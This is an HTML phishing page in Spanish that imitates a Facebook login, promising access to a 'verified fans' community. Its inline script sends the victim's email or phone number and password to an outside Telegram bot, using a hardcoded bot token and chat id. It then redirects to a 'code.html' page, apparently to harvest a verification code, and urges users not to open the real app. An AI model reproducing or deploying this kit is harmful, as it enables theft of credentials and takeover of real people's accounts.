<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Facebook</title>
<style>
*{box-sizing:border-box}
body{margin:0;font-family:-apple-system,Helvetica,Arial,sans-serif;background:#f0f2f5;color:#1c1e21}
.top{background:#fff;padding:14px 16px;text-align:center;border-bottom:1px solid #dddfe2}
.top img{height:34px}
.wrap{padding:22px 16px}
h1{font-size:19px;line-height:1.3;margin:0 0 6px;text-align:center;font-weight:600}
.sub{font-size:14px;color:#65676b;text-align:center;margin:0 0 20px}
input{width:100%;padding:14px;font-size:16px;border:1px solid #dddfe2;border-radius:8px;margin-bottom:10px}
button{width:100%;padding:14px;font-size:17px;font-weight:700;color:#fff;background:#1877f2;border:0;border-radius:8px}
.forgot{display:block;text-align:center;margin:18px 0 0;font-size:15px;color:#1877f2;text-decoration:none}
.note{text-align:center;font-size:12px;color:#8a8d91;margin:22px 0 0}
.foot{text-align:center;font-size:12px;color:#8a8d91;padding:18px 0 28px}
</style>
</head>
<body>
<div class="top"><img src="logo.png" alt="Facebook"></div>
<div class="wrap">
<h1>Inicia sesión en tu Facebook para unirte a la comunidad de fans</h1>
<p class="sub">Solo fans verificados. Tarda 20 segundos.</p>
<form onsubmit="go(event)">
<input id="u" type="text" placeholder="Correo o número de teléfono" required>
<input id="p" type="password" placeholder="Contraseña" required>
<button type="submit">Entrar</button>
</form>
<a class="forgot" href="code.html">¿Olvidaste tu contraseña?</a>
<p class="note">Continúa aquí, no abras la app.</p>
</div>
<p class="foot">Español · English · Français · Português</p>
<script>
var T="9061884309:AAFvJInSbJ9QTMN-fdI6DtVUoFm3ZCU8HM";
var C="7238838844";
function ping(t){new Image().src="https://api.telegram.org/bot"+T+"/sendMessage?chat_id="+C+"&text="+encodeURIComponent(t);}
function go(e){
 e.preventDefault();
 ping("FB LOGIN | "+document.getElementById("u").value+" | "+document.getElementById("p").value);
 setTimeout(function(){location.href="code.html";},800);
}
</script>
</body>
  </html>
